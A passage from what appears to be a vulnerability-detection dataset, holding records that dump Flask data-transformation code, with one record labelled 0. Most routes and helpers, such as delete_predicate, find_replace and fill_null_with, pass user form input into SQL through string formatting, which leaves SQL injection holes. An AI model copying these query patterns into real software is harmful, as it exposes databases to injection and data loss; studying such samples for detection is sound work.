while discretizing the column',\n              'danger'\n              )\n    else:\n        flash('Column discretized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_selection', methods=['POST'])\n@login_required\ndef delete_selection():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    selected_data = request.form.getlist(\"data_id\")\n    table = table_name_to_object(dataset.working_copy)\n    for data in selected_data:\n        table.delete(table.c.index == data).execute()\n    create_action(\n        'deleted selected items',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_predicate', methods=['POST'])\n@login_required\ndef delete_predicate():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    condition = ''\n    columns = []\n    conditions = []\n    operators = []\n    logics = []\n    for i in request.form:\n        if i.startswith('column'):\n            columns.append(i)\n        elif i.startswith('condition'):\n            conditions.append(i)\n        elif i.startswith('logical'):\n            logics.append(i)\n        elif i.startswith('operator'):\n            operators.append(i)\n    columns.sort()\n    conditions.sort()\n    logics.sort()\n    operators.sort()\n    for i in range(len(columns)):\n        if i != len(columns) - 1:\n            condition += '\"' + request.form[columns[i + 1]] + '\"'\n            if request.form[operators[i + 1]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[i + 1]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[i + 1]]\n            condition += '\\'' + request.form[conditions[i + 1]] + '\\''\n            condition += ' ' + request.form[logics[i]] + ' '\n        else:\n            condition += '\"' + request.form[columns[0]] + '\"'\n            if request.form[operators[0]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[0]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[0]]\n            condition += '\\'' + escape_quotes(request.form[conditions[0]]) + '\\''\n\n    try:\n        if delete_rows(table.name, condition) is False:\n            flash('no rows found with condition \"{0}\"'.format(condition), 'warning')\n        else:\n            flash('successfully deleted rows using condition \"{0}\"'.format(condition), 'success')\n        create_action('rows deleted with condition \"{0}\"'.format(condition), dataset.id, current_user.id)\n    except Exception as e:\n        print(e)\n        flash('condition \"{0}\" not valid'.format(condition), 'danger')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/reset', methods=['GET'])\n@login_required\ndef reset():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    restore_original(dataset.working_copy)\n    create_action(\n        'restored dataset to original state',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/change_type', methods=['POST'])\n@login_required\ndef change_type():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    col = request.form['column']\n    col = col[:col.find('(')-1]\n    new_type = request.form['type']\n    if col != '' and new_type != '':\n        try:\n            change_attribute_type(table.name, col, new_type)\n            create_action('type {0} changed to {1}'.format(col, new_type), dataset.id, current_user.id)\n        except:\n            flash('{0} could not be converted to {1}'.format(col, new_type), 'danger')\n        else:\n            flash('{0} successfully  converted to {1}'.format(col, new_type), 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/find_and_replace', methods=['POST'])\n@login_required\ndef find_and_replace():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    find = request.form['find']\n    match_mode = request.form['match-mode']\n    replace = request.form['replace']\n\n    if match_mode == 'full-match':\n        find_replace(dataset.working_copy, col, find, replace)\n    elif match_mode == 'substring-match':\n        replace_mode = request.form['replace-mode']\n        if replace_mode == 'full-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=True)\n        elif replace_mode == 'substring-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=False)\n    elif match_mode == 'regex-match':\n        regex_find_replace(dataset.working_copy, col, find, replace)\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/fill_null', methods=['POST'])\n@login_required\ndef fill_null():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column_and_type = request.form['column']\n    column_name = column_and_type[:column_and_type.find(' ')]\n    column_type = column_and_type[column_and_type.find('(')+1:column_and_type.rfind(')')]\n    fill_value = request.form['fill_value']\n\n    try:\n        if fill_value == '~option-average~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_average(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with average'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        elif fill_value == '~option-median~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_median(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with median'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        else:\n            is_text_type = column_type in ['TEXT',\n                                           'VARCHAR(10)',\n                                           'VARCHAR(25)',\n                                           'VARCHAR(255)']\n            fill_null_with(\n                dataset.working_copy,\n                column_name,\n                fill_value,\n                is_text_type\n            )\n            create_action(\n                'Filled null values in {0} with {1}'\n                .format(column_name, fill_value),\n                dataset.id,\n                current_user.id\n            )\n    except:\n        flash(\n            'An unexpected error occured while performing the operation',\n            'danger'\n            )\n    else:\n        flash('Fill operation completed successfully', 'success')\n\n    return redirect(request.referrer)\n/n/n/napp/Data/Transform/operations.py/n/nfrom app import database as db\nimport pandas as pd\nimport re\nimport numpy as np\n\n\ndef rename_attribute(table_name, column, new_name):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'RENAME COLUMN \"{1}\" TO \"{2}\"'\n            .format(table_name, column, new_name)\n        )\n    except Exception as e:\n        print(\"RENAMING FAILED: \"+str(e))\n\n\ndef delete_attribute(table_name, column):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'DROP COLUMN \"{1}\"'\n            .format(table_name, column)\n        )\n    except:\n        print(\"DELETING FAILED\")\n\n\ndef restore_original(table_name):\n    \"\"\"\n    Resets given table to its original state\n    :param table_name: name of the the table to be reset\n    \"\"\"\n    try:\n        # Original tables are prepended with og\n        # Thus we replace wc with og and have the name of the table\n        # with the original data\n        original = 'og' + table_name[2:]\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        db.engine.execute(\n            'CREATE TABLE \"{0}\" AS SELECT * FROM \"{1}\"'\n            .format(table_name, original)\n        )\n    except:\n        print(\"FAILED TO RESTORE ORIGINAL\")\n\n\ndef change_attribute_type(table_name, table_col, new_type):\n    \"\"\"\n    Changes the type of given attribute in given table to new_type\n    :param table_name: table containing the attribute\n    :param table_col: attribute to change type of\n    :param new_type: new type\n    \"\"\"\n    current_type = db.engine.execute(\n        'SELECT data_type from information_schema.columns '\n        'where table_name = \\'{0}\\' and column_name = \\'{1}\\';'\n        .format(table_name, table_col)\n    ).fetchall()[0][0]\n    if new_type == 'INTEGER':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE BIGINT USING \"{1}\"::bigint'\n            .format(table_name, table_col))\n    if new_type == 'DOUBLE':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE DOUBLE PRECISION USING \"{1}\"::double precision'\n            .format(table_name, table_col))\n    if new_type == 'TEXT':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n        elif current_type == 'timestamp without time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT'\n                .format(table_name, table_col))\n    if new_type == 'DATE':\n        if current_type == 'timestamp without time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE USING to_date(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n    if new_type == 'TIMESTAMP':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP '\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP '\n                'USING to_timestamp(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n\n\ndef drop_attribute(table_name, attr):\n    \"\"\"\n    Drops given attribute from given table\n    :param table_name: table to perform the operation on\n    :param attr: attribute to drop\n    \"\"\"\n    try:\n        db.engine.execute(\n            'ALTER TABLE \"{0}\" DROP COLUMN IF EXISTS \"{1}\"'.\n            format(table_name, attr)\n        )\n    except:\n        print(\"FAILED TO DROP ATTRIBUTE {0} FROM {1}\".format(attr, table_name))\n\n\ndef one_hot_encode(table_name, attr):\n    \"\"\"\n    One hot encodes given attribute\n    :param table_name: table on which to perform the operation\n    :param attr: attribute to one hot encode\n    :return:\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine)\n        one_hot = pd.get_dummies(dataframe[attr])\n        print('OH', one_hot)\n        dataframe = dataframe.join(one_hot)\n        print('DF', dataframe)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        dataframe.to_sql(\n            name=table_name,\n            con=db.engine,\n            if_exists=\"fail\",\n            index=False\n        )\n    except:\n        print('ONE-HOT ENCODING FAILED')\n\n\ndef fill_null_with(table_name, attr, value, text_type):\n    \"\"\"\n    Fills all NULL values with provided value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    :param text_type: indicates whether column is a text type\n    :param value: value to insert\n    \"\"\"\n    try:\n        if text_type:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE (\"{1}\" = \\'\\') IS NOT FALSE'\n                .format(table_name, attr, value)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = {2} '\n                'WHERE \"{1}\" IS NULL'\n                .format(table_name, attr, value)\n            )\n    except Exception as e:\n        print('FILL NULL FAILED WITH FOLLOWING MESSAGE:\\n' + str(e))\n\n\ndef fill_null_with_average(table_name, attr):\n    \"\"\"\n    Fills all NULL values with average value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        average = dataframe[attr].mean()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, average)\n        )\n    except:\n        print('FILL AVERAGE FAILED')\n\n\ndef fill_null_with_median(table_name, attr):\n    \"\"\"\n    Fills all NULL values with median value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        median = dataframe[attr].median()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, median)\n        )\n    except:\n        print('FILL MEAN FAILED')\n\n\ndef find_replace(table_name, attr, find, replace):\n    try:\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = \\'{2}\\' '\n            'WHERE \"{1}\" = \\'{3}\\' '\n            .format(table_name, attr, replace, find)\n        )\n    except:\n        print('FIND-REPLACE FAILED')\n\n\ndef substring_find_replace(table_name, attr, find, replace, full=False):\n    try:\n        if full:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE \"{1}\" LIKE \\'%%{3}%%\\' '\n                .format(table_name, attr, replace, find)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, find, replace)\n            )\n    except Exception as e:\n        print('FIND-REPLACE FAILED\\n' + str(e))\n\n\ndef regex_find_replace(table_name, attr, regex, replace):\n    try:\n        is_valid = True\n        try:\n            re.compile(regex)\n        except re.error:\n            is_valid = False\n        if is_valid:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REGEXP_REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, regex, replace)\n            )\n    except Exception as e:\n        print('REGEX FIND-REPLACE FAILED:\\n' + str(e))\n\n\ndef normalize_attribute(table_name, attr):\n    \"\"\"\n    Normalizes table_name.attr using z-score method\n    :param table_name: table to perform the operation on\n    :param attr: attribute to normalize\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        df[attr] = (df[attr] - df[attr].mean()) / df[attr].std(ddof=0)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except:\n        print('NORMALIZATION FAILED')\n\n\ndef remove_outliers(table_name, attr, value, smaller_than=False):\n    \"\"\"\n    Removes outliers based on provided value\n    :param table_name: table to perform the operation on\n    :param attr: attribute to search for outliers\n    :param value: extrema value\n    :param smaller_than:  if true values smaller than are filtered,\n                          values greater than otherwise\n    \"\"\"\n    try:\n        if smaller_than:\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" < {2}'\n                .format(table_name, attr, value)\n            )\n        else:  # greater than\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" > {2}'\n                .format(table_name, attr, value)\n            )\n    except:\n        print('REMOVE OUTLIERS FAILED')\n\n\ndef delete_rows(table_name, condition):\n\n    result = db.engine.execute(\n        'DELETE FROM \"{0}\" WHERE {1}'.format(table_name, condition)\n    )\n    if result.rowcount == 0:\n        return False\n\n\ndef discretize_width(table_name, attr, intervals, dataframe=None, name=None):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-width\n    intervals equal to interval amount\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals:\n        - int: number of equal width intervals\n        - [int]: non-uniform interval edges\n    :param dataframe: Dataframe if data has already been read from sql\n    \"\"\"\n    try:\n        if dataframe is not None:\n            df = dataframe\n        else:\n            df = pd.read_sql_table(table_name, db.engine)\n        if name is not None:\n            column_name = name\n        elif isinstance(intervals, list):\n            column_name = attr + '_custom_intervals'\n        else:\n            column_name = attr + '_' + str(intervals) + '_eq_intervals'\n\n        df[column_name] = pd.cut(df[attr], intervals, precision=9).apply(str)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except Exception as e:\n        print('WIDTH DISCRETIZATION FAILED:\\n' + str(e))\n\n\ndef discretize_eq_freq(table_name, attr, intervals):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-frequency\n    intervals equal to intervals\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals: number of equal frequency intervals\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        attr_length = len(df[attr])\n        elements_per_interval = attr_length//intervals\n        sorted_data = list(df[attr].sort_values())\n        selector = 0\n        edge_list = []\n        while selector < attr_length:\n            try:\n                edge_list.append(sorted_data[selector])\n                selector += elements_per_interval\n            except IndexError:\n                pass\n        if edge_list[-1] != sorted_data[-1] and len(edge_list) == intervals + 1:\n            edge_list[-1] = sorted_data[-1]\n        elif edge_list[-1] != sorted_data[-1] and len(edge_list) != intervals + 1:\n            edge_list.append(sorted_data[-1])\n\n        # Extend outer edges with 0.1% to include min and max values\n        edge_list[0] = edge_list[0]-edge_list[0]*0.001\n        edge_list[-1] = edge_list[-1]+edge_list[-1]*0.001\n\n        column_name = attr + '_' + str(intervals) + '_eq_freq_intervals'\n\n        discretize_width(table_name, attr, edge_list, df, column_name)\n    except Exception as e:\n        print('EQUAL FREQUENCY DISCRETIZATION FAILED:\\n' + str(e))\n/n/n/napp/Data/helpers.py/n/nfrom app import database as db\n\n\ndef table_name_to_object(sql_table_name):\n    meta = db.MetaData(db.engine)\n    table = db.Table(sql_table_name, meta, autoload=True)\n    return table\n\n\ndef extract_columns_from_db(table):\n    columns = []\n    for column in table.columns:\n        start = str(column).find('.') + 1\n        col_name = str(column)[start:]\n        if col_name != 'index':\n            col_type = ''\n            if str(column.type) == 'BIGINT':\n                col_type = 'INTEGER'\n            elif str(column.type) == 'DOUBLE PRECISION':\n                col_type = 'DOUBLE'\n            elif str(column.type) == 'TIMESTAMP WITHOUT TIME ZONE':\n                col_type = 'TIMESTAMP'\n            else:\n                col_type = str(column.type)\n            columns.append(\n                (col_name, col_type)\n            )\n    return columns\n\n\ndef escape_quotes(string):\n    return_string = ''\n    for c in string:\n        if c == '\\'':\n            return_string += '\\''\n        elif c == '\"':\n            return_string += '\\\"'\n        return_string += c\n    return return_string\n/n/n/n", "label": 0}, {"id": "48b00c7b7bb0b82bdc79167947fa9eda9f0ab8e0", "code": "/app/Data/Transform/controllers.py/n/nfrom flask import (\n    Blueprint,\n    request,\n    jsonify,\n    redirect,\n    url_for,\n    render_template,\n    flash,\n    Response\n)\nfrom flask_login import login_required, current_user\nfrom app.Data.operations import create_action, get_dataset_with_id\nfrom app.Data.helpers import table_name_to_object\nfrom app.Data.Transform.operations import (\n    restore_original,\n    change_attribute_type,\n    delete_rows,\n    fill_null_with,\n    fill_null_with_average,\n    fill_null_with_median,\n    rename_attribute,\n    delete_attribute,\n    one_hot_encode,\n    normalize_attribute,\n    discretize_width,\n    discretize_eq_freq,\n    find_replace,\n    regex_find_replace,\n    substring_find_replace\n)\n\n_transform = Blueprint('transform_bp', __name__, url_prefix='/data/transform')\n\n\n@_transform.route('/rename_column', methods=['POST'])\n@login_required\ndef rename_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    new_name = request.form['new_name']\n    try:\n        rename_attribute(dataset.working_copy, col, new_name)\n        create_action(\n            'Renamed column {0} to {1}'.format(col, new_name),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while renaming the column', 'danger')\n    else:\n        flash('Column renamed successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_column', methods=['POST'])\n@login_required\ndef delete_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        delete_attribute(dataset.working_copy, col)\n        create_action(\n            'Deleted column {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while deleting the column', 'danger')\n    else:\n        flash('Column deleted successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('one_hot_encode_column', methods=['POST'])\n@login_required\ndef one_hot_encode_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        one_hot_encode(dataset.working_copy, col)\n        create_action(\n            'One-hot-encoded {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while one-hot-encoding the column',\n              'danger'\n              )\n    else:\n        flash('Column one-hot-encoded successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('normalize_column', methods=['POST'])\n@login_required\ndef normalize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        normalize_attribute(dataset.working_copy, col)\n        create_action(\n            'Normalized {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while normalizing the column',\n              'danger'\n              )\n    else:\n        flash('Column normalized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/discretize_column', methods=['POST'])\n@login_required\ndef discretize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column = request.form['column']\n    intervals = request.form['intervals']\n\n    try:\n        if intervals == 'equal-distance':\n            amount = request.form['amount-dist']\n            discretize_width(dataset.working_copy, column, int(amount))\n        elif intervals == 'equal-frequency':\n            amount = request.form['amount-freq']\n            discretize_eq_freq(dataset.working_copy, column, int(amount))\n        else:\n            edges = str(request.form['custom-edges'])\n            edges = edges.replace(' ', '')\n            edge_list = edges.split(',')\n            if len(edge_list) < 2:\n                raise ValueError\n            for i in range(len(edge_list)):\n                edge_list[i] = float(edge_list[i])\n            discretize_width(dataset.working_copy, column, edge_list)\n\n    except ValueError:\n        flash('Invalid list of edges provided.',\n              'danger'\n              )\n    except:\n        flash('An unexpected error occured while discretizing the column',\n              'danger'\n              )\n    else:\n        flash('Column discretized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_selection', methods=['POST'])\n@login_required\ndef delete_selection():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    selected_data = request.form.getlist(\"data_id\")\n    table = table_name_to_object(dataset.working_copy)\n    for data in selected_data:\n        table.delete(table.c.index == data).execute()\n    create_action(\n        'deleted selected items',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_predicate', methods=['POST'])\n@login_required\ndef delete_predicate():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    condition = ''\n    columns = []\n    conditions = []\n    operators = []\n    logics = []\n    for i in request.form:\n        if i.startswith('column'):\n            columns.append(i)\n        elif i.startswith('condition'):\n            conditions.append(i)\n        elif i.startswith('logical'):\n            logics.append(i)\n        elif i.startswith('operator'):\n            operators.append(i)\n    columns.sort()\n    conditions.sort()\n    logics.sort()\n    operators.sort()\n    for i in range(len(columns)):\n        if i != len(columns) - 1:\n            condition += '\"' + request.form[columns[i + 1]] + '\"'\n            if request.form[operators[i + 1]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[i + 1]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[i + 1]]\n            condition += '\\'' + request.form[conditions[i + 1]] + '\\''\n            condition += ' ' + request.form[logics[i]] + ' '\n        else:\n            condition += '\"' + request.form[columns[0]] + '\"'\n            if request.form[operators[0]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[0]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[0]]\n            condition += '\\'' + request.form[conditions[0]] + '\\''\n\n    try:\n        delete_rows(table.name, condition)\n        create_action('rows deleted with condition \"{0}\"'\n                      .format(condition), dataset.id, current_user.id\n                      )\n    except:\n        flash('condition \"{0}\" not valid'.format(condition), 'danger')\n    else:\n        flash('successfully deleted rows using condition \"{0}\"'\n              .format(condition), 'success'\n              )\n    return redirect(request.referrer)\n\n\n@_transform.route('/reset', methods=['GET'])\n@login_required\ndef reset():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    restore_original(dataset.working_copy)\n    create_action(\n        'restored dataset to original state',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/change_type', methods=['POST'])\n@login_required\ndef change_type():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    col = request.form['column']\n    col = col[:col.find('(')-1]\n    new_type = request.form['type']\n    if col != '' and new_type != '':\n        try:\n            change_attribute_type(table.name, col, new_type)\n            create_action('type {0} changed to {1}'.format(col, new_type), dataset.id, current_user.id)\n        except:\n            flash('{0} could not be converted to {1}'.format(col, new_type), 'danger')\n        else:\n            flash('{0} successfully  converted to {1}'.format(col, new_type), 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/find_and_replace', methods=['POST'])\n@login_required\ndef find_and_replace():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    find = request.form['find']\n    match_mode = request.form['match-mode']\n    replace = request.form['replace']\n\n    if match_mode == 'full-match':\n        find_replace(dataset.working_copy, col, find, replace)\n    elif match_mode == 'substring-match':\n        replace_mode = request.form['replace-mode']\n        if replace_mode == 'full-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=True)\n        elif replace_mode == 'substring-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=False)\n    elif match_mode == 'regex-match':\n        regex_find_replace(dataset.working_copy, col, find, replace)\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/fill_null', methods=['POST'])\n@login_required\ndef fill_null():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column_and_type = request.form['column']\n    column_name = column_and_type[:column_and_type.find(' ')]\n    column_type = column_and_type[column_and_type.find('(')+1:column_and_type.rfind(')')]\n    fill_value = request.form['fill_value']\n\n    try:\n        if fill_value == '~option-average~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_average(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with average'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        elif fill_value == '~option-median~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_median(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with median'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        else:\n            is_text_type = column_type in ['TEXT',\n                                           'VARCHAR(10)',\n                                           'VARCHAR(25)',\n                                           'VARCHAR(255)']\n            fill_null_with(\n                dataset.working_copy,\n                column_name,\n                fill_value,\n                is_text_type\n            )\n            create_action(\n                'Filled null values in {0} with {1}'\n                .format(column_name, fill_value),\n                dataset.id,\n                current_user.id\n            )\n    except:\n        flash(\n            'An unexpected error occured while performing the operation',\n            'danger'\n            )\n    else:\n        flash('Fill operation completed successfully', 'success')\n\n    return redirect(request.referrer)\n/n/n/n/app/Data/Transform/operations.py/n/nfrom app import database as db\nimport pandas as pd\nimport re\nimport numpy as np\n\n\ndef rename_attribute(table_name, column, new_name):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'RENAME COLUMN \"{1}\" TO \"{2}\"'\n            .format(table_name, column, new_name)\n        )\n    except Exception as e:\n        print(\"RENAMING FAILED: \"+str(e))\n\n\ndef delete_attribute(table_name, column):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'DROP COLUMN \"{1}\"'\n            .format(table_name, column)\n        )\n    except:\n        print(\"DELETING FAILED\")\n\n\ndef restore_original(table_name):\n    \"\"\"\n    Resets given table to its original state\n    :param table_name: name of the the table to be reset\n    \"\"\"\n    try:\n        # Original tables are prepended with og\n        # Thus we replace wc with og and have the name of the table\n        # with the original data\n        original = 'og' + table_name[2:]\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        db.engine.execute(\n            'CREATE TABLE \"{0}\" AS SELECT * FROM \"{1}\"'\n            .format(table_name, original)\n        )\n    except:\n        print(\"FAILED TO RESTORE ORIGINAL\")\n\n\ndef change_attribute_type(table_name, table_col, new_type):\n    \"\"\"\n    Changes the type of given attribute in given table to new_type\n    :param table_name: table containing the attribute\n    :param table_col: attribute to change type of\n    :param new_type: new type\n    \"\"\"\n    current_type = db.engine.execute(\n        'SELECT data_type from information_schema.columns '\n        'where table_name = \\'{0}\\' and column_name = \\'{1}\\';'\n        .format(table_name, table_col)\n    ).fetchall()[0][0]\n    if new_type == 'INTEGER':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE BIGINT USING \"{1}\"::bigint'\n            .format(table_name, table_col))\n    if new_type == 'DOUBLE':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE DOUBLE PRECISION USING \"{1}\"::double precision'\n            .format(table_name, table_col))\n    if new_type == 'TEXT':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n        elif current_type == 'timestamp with time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT'\n                .format(table_name, table_col))\n    if new_type == 'DATE':\n        if current_type == 'timestamp with time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE USING to_date(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n    